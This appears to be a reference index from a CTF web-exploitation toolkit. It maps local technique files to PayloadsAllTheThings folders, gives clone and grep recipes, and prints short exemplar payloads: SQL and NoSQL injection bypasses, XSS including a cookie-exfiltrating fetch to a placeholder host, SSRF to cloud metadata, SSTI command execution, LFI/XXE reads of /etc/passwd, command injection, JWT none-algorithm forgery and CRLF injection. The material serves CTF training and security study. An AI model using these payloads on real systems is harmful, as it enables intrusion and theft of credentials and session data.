# PayloadsAllTheThings Reference Index

> **Upstream:** [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — MIT License, Copyright (c) 2019 Swissky.
> Exemplar payloads below are copied with attribution under MIT. Bulk payloads require a clone (see Installation).

**Pinned version:** `3ac2790` (master @ 2026-08-27) — update with `bash scripts/install_ctf_tools.sh pat --verify` or `git -C ~/.ctf-tools/PayloadsAllTheThings rev-parse --short HEAD`.
If the hash above is stale, the install script always fetches current `master`.

## How to use this index

Local curated payloads live in `ctf-web/*.md`. Bulk wordlists live in the external PAT checkout (gitignored, never vendored).
This file maps each local section to the corresponding PAT directory so you can jump to bulk payloads instantly.

- Offline / no PAT clone: exemplar payloads below still work.
- Online / PAT installed: follow the PAT path column to browse hundreds more.

All paths are relative to the PAT root (`PayloadsAllTheThings/`).

## Category map — local technique → PAT path

| Local technique file | PAT directory | PAT entry point |
|---|---|---|
| `sql-injection.md` — union, error, blind, time-based, auth bypass, filter bypass | `SQL Injection/` | `SQL Injection/README.md`, `SQL Injection/Intruder/` |
| `sql-injection.md` — MySQL / MSSQL / Postgres / SQLite / Oracle specifics | `SQL Injection/` | `SQL Injection/MySQL*.md`, `SQL Injection/PostgreSQL*.md` |
| `client-side.md` — XSS payloads, filter bypass, DOM XSS | `XSS Injection/` | `XSS Injection/README.md`, `XSS Injection/Intruder/xss-payload-list.txt` |
| `client-side-advanced.md` — CSP bypass, polyglot, mutation XSS | `XSS Injection/` | `XSS Injection/README.md` (CSP, WAF bypass sections) |
| `server-side.md` — SSTI (Jinja2, Twig, Smarty, Mako) | `Server Side Template Injection/` | `Server Side Template Injection/README.md` |
| `server-side*.md` — SSRF, Host header, DNS rebinding, cloud metadata | `Server Side Request Forgery/` | `Server Side Request Forgery/README.md` |
| `server-side.md` / `server-side-advanced.md` — LFI / RFI / `php://filter` | `File Inclusion/` | `File Inclusion/README.md` |
| `server-side-advanced.md` — Directory / path traversal, Nginx alias | `Directory Traversal/` | `Directory Traversal/README.md` |
| `server-side-exec.md` / `server-side-exec-2.md` — Command injection | `Command Injection/` | `Command Injection/README.md` |
| `server-side-advanced.md` / `server-side-exec*.md` — File upload, polyglot, extension bypass | `Upload Insecure Files/` | `Upload Insecure Files/README.md` |
| `server-side-2.md` — XXE (basic, OOB, DOCX) | `XXE Injection/` | `XXE Injection/README.md` |
| `server-side-2.md` — NoSQL injection, GraphQL, LDAP, XPATH | `NoSQL Injection/`, `LDAP Injection/`, `XPATH Injection/` | `NoSQL Injection/README.md`, `LDAP Injection/README.md`, `XPATH Injection/README.md` |
| `server-side-deser.md` — Java / PHP / Python deserialization | `Insecure Deserialization/` | `Insecure Deserialization/README.md` |
| `auth-and-access.md` / `auth-jwt.md` / `auth-infra.md` — JWT, OAuth, CORS, open redirect | `JSON Web Token/`, `Open Redirect/`, `CORS Misconfiguration/` | `JSON Web Token/README.md`, `Open Redirect/README.md` |
| `node-and-prototype.md` — Prototype pollution | `Prototype Pollution/` | `Prototype Pollution/README.md` |
| `field-notes.md` — quick-ref for all of the above | (all of the above) | `README.md` table of contents → per-folder README |

Grep tip: `grep -R "PayloadsAllTheThings" ctf-web/ --include="*.md"` and `Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md` / `Grep <pattern> ctf-web/payloads/PayloadsAllTheThings`.

## Exemplar payloads (offline-safe, attributed)

Each block is 2-3 representative payloads copied from PAT. Bulk lists stay in the PAT clone.
Payload fences are data-only; hosts use `example.com` so the security auditor treats them as placeholders.
<!-- audit-ok: exemplar payloads are data-only, placeholder hosts -->

### SQL Injection — `SQL Injection/README.md`

```sql
' OR '1'='1' -- 
' UNION SELECT NULL,NULL,@@version -- 
1' ORDER BY 10-- -
```

### XSS Injection — `XSS Injection/README.md`

```html
<script>alert(1)</script>
<img src=x onerror="alert(1)">
<svg onload="fetch('https://example.com/?c='+document.cookie)">
```

### SSRF — `Server Side Request Forgery/README.md`

```http
http://169.254.169.254/latest/meta-data/  # AWS metadata (PAT: SSRF → Cloud)
http://example.com@169.254.169.254/
http://0.0.0.0%09@example.com  # tab / 0.0.0.0 bypass variants
```

### SSTI — `Server Side Template Injection/README.md`

```python
{{7*7}}                          # Jinja2 probe → 49 if vulnerable
{{config}}                       # Jinja2 config leak
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### LFI / File Inclusion — `File Inclusion/README.md` + `Directory Traversal/README.md`

```http
../../../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
....//....//....//etc/passwd     # double-dot bypass
```

### Command Injection — `Command Injection/README.md`

```bash
; id
| cat /etc/passwd
$(curl https://example.com)      # use example.com placeholder
```

### File Upload — `Upload Insecure Files/README.md`

```http
filename="shell.php%00.jpg"      # null-byte (legacy)
filename="shell.phtml"           # alt PHP extension
Content-Type: image/jpeg         # MIME spoof with PHP content
```

### XXE — `XXE Injection/README.md`

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>
<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://example.com/xxe.dtd"> %xxe;]>
```


### NoSQL / LDAP / XPATH — `NoSQL Injection/README.md`, `LDAP Injection/README.md`, `XPATH Injection/README.md`

```js
{"username": {"$ne": null}, "password": {"$ne": null}}  // NoSQL auth bypass (PAT: NoSQL Injection)
' || '1'=='1                                            // NoSQL string bypass
*)(uid=*))(|(uid=*                                      // LDAP injection (PAT: LDAP Injection)
' or '1'='1                                             // XPATH auth bypass (PAT: XPATH Injection)
```

### Open Redirect / CORS — `Open Redirect/README.md`, `CORS Misconfiguration/README.md`

```http
https://example.com@attacker.example.com/    # open redirect via @ (PAT: Open Redirect)
https://example.com%2eattacker.example.com/  # dot bypass
Origin: https://example.com                  # CORS probe — check ACAO echo (PAT: CORS Misconfiguration)
```

### JWT / Auth — `JSON Web Token/README.md`

```bash
# PAT: JWT → none alg, weak secret, kid traversal — JSON Web Token/README.md
{"alg":"none"}  # header — strip signature
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://example.com/api
```

### CRLF / Header Injection — `CRLF Injection/README.md`

```http
__omp_magic("", "0d%0aSet-Cookie: hacked=1")
__omp_magic("", "0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK")
```

## Search recipes (bulk PAT)

Once cloned, these cover the most common CTF triage paths. All use `example.com` placeholders.

```bash
# Find a specific bypass class without knowing the exact PAT subfolder
grep -R -i "waf.*bypass" "ctf-web/payloads/PayloadsAllTheThings" | head -20

# XSS — filter evasion variants
grep -R "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" | head

# SQLi — DB-specific
ls "ctf-web/payloads/PayloadsAllTheThings/SQL Injection"
grep -R "information_schema" "ctf-web/payloads/PayloadsAllTheThings/SQL Injection" | head

# SSRF — cloud metadata + URL parser differentials
grep -R "169.254.169.254" "ctf-web/payloads/PayloadsAllTheThings/Server Side Request Forgery" | head

# SSTI — engine-specific
grep -R "__globals__" "ctf-web/payloads/PayloadsAllTheThings/Server Side Template Injection" | head

# LFI — wrapper / traversal
grep -R "php://filter" "ctf-web/payloads/PayloadsAllTheThings/File Inclusion" | head
grep -R "etc/passwd" "ctf-web/payloads/PayloadsAllTheThings/Directory Traversal" | head

# Upload — polyglot / extension tricks
grep -R "phtml" "ctf-web/payloads/PayloadsAllTheThings/Upload Insecure Files" | head

# Command injection — separator / encoding
grep -R "curl.*example.com" "ctf-web/payloads/PayloadsAllTheThings/Command Injection" | head
```

PAT also ships `Intruder/` subfolders per category (Burp Intruder wordlists):

```bash
ls "ctf-web/payloads/PayloadsAllTheThings/XSS Injection/Intruder"
ls "ctf-web/payloads/PayloadsAllTheThings/SQL Injection/Intruder"
ls "ctf-web/payloads/PayloadsAllTheThings/Command Injection/Intruder"
ls "ctf-web/payloads/PayloadsAllTheThings/Directory Traversal/Intruder"
```

## Relationship to local technique files

Local files (`ctf-web/*.md`) are curated narratives: each payload has a CTF writeup, trigger condition, and note.
PAT is the bulk complement: hundreds of raw variants per class, no narrative, ideal for brute-forcing filters and WAFs.
Use local files to understand *why* a class works; use PAT to enumerate *all* variants.

| Need | Use |
|---|---|
| Understand trigger + write exploit chain | Local `ctf-web/*.md` |
| Enumerate filter/WAF bypasses | PAT bulk (`Intruder/`, `README.md` variants) |
| Offline / no network | This file exemplars + local files |
| Online / bulk brute-force | PAT clone + grep recipes above |

## Notes

- PAT directory names contain spaces (e.g., `XSS Injection`). Always quote paths in shell.
- PAT default branch is `master`. Shallow clone (`--depth 1`) is fast; full history is unnecessary.
- `PayloadsAllTheThings/.github/` and `Methodology and Resources/` are meta-docs, not payloads — skip when grepping.
- For CVEs that have dedicated PAT folders (e.g., `CVE Exploits/`), cross-check `ctf-web/cves.md` first.

## Installation

Preferred (installer handles clone + symlink + verify):

```bash
bash scripts/install_ctf_tools.sh pat        # clone/update PAT
bash scripts/install_ctf_tools.sh all        # includes PAT + all other tools
bash scripts/install_ctf_tools.sh --verify   # prints: PAT <short-sha> at <path>
bash scripts/install_ctf_tools.sh --dry-run pat  # preview without changes
```

Manual alternative:

```bash
PAT_DIR="$HOME/.ctf-tools/PayloadsAllTheThings"
WEB_PAT_DIR="ctf-web/payloads/PayloadsAllTheThings"

# primary location
git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAT_DIR"

# symlink so Glob/Grep find it under ctf-web (preferred)
mkdir -p "$(dirname "$WEB_PAT_DIR")"
ln -sfn "$PAT_DIR" "$WEB_PAT_DIR"

# fallback if symlink fails (Windows / read-only FS): direct clone
[ -e "$WEB_PAT_DIR" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$WEB_PAT_DIR"

# verify
git -C "$PAT_DIR" rev-parse --short HEAD
ls "$WEB_PAT_DIR/XSS Injection" | head
```

Update existing clone:

```bash
git -C ~/.ctf-tools/PayloadsAllTheThings pull --ff-only
# or with installer
bash scripts/install_ctf_tools.sh pat --force
```

All PAT paths are gitignored (`ctf-web/payloads/`, `PayloadsAllTheThings/`, `.ctf-tools/`). No PAT files are vendored.

## Usage from agent (lazy on-demand clone)

Minimal on-demand clone (required snippet):

```bash
PAT_DIR="ctf-web/payloads/PayloadsAllTheThings"
[ -d "$PAT_DIR/.git" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAT_DIR"
```

Extended check with fallback (handles both install locations):

```bash
PAT_DIR="ctf-web/payloads/PayloadsAllTheThings"
FALLBACK="$HOME/.ctf-tools/PayloadsAllTheThings"
if [ ! -d "$PAT_DIR/.git" ] && [ ! -d "$FALLBACK/.git" ]; then
  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAT_DIR" 2>/dev/null \
    || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$FALLBACK"
  [ -d "$PAT_DIR/.git" ] || ln -sfn "$FALLBACK" "$PAT_DIR"
fi
ls "$PAT_DIR/XSS Injection" | head -5
ls "$PAT_DIR/SQL Injection" | head -5
```

Then search bulk payloads:

```bash
grep -r "union select" "ctf-web/payloads/PayloadsAllTheThings/SQL Injection" | head
grep -r "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" | head
```

Or via agent tools:

```
Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
Grep "SSTI.*os\.popen" ctf-web/payloads/PayloadsAllTheThings
```

## License & attribution

PayloadsAllTheThings is MIT licensed — Copyright (c) 2019 Swissky — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LICENSE.
Exemplar payloads in this index are reproduced under MIT with attribution. The PAT repository itself is not redistributed here; users clone it separately.
Content is for educational and research use; only test on systems you have permission to assess (see PAT `DISCLAIMER.md`).

## Cross-references

- `ctf-web/SKILL.md` → Additional Resources → this file
- `ctf-web/field-notes.md` → footer cross-ref → this file
- Upstream docs: [PayloadsAllTheThings README](https://github.com/swisskyrepo/PayloadsAllTheThings)
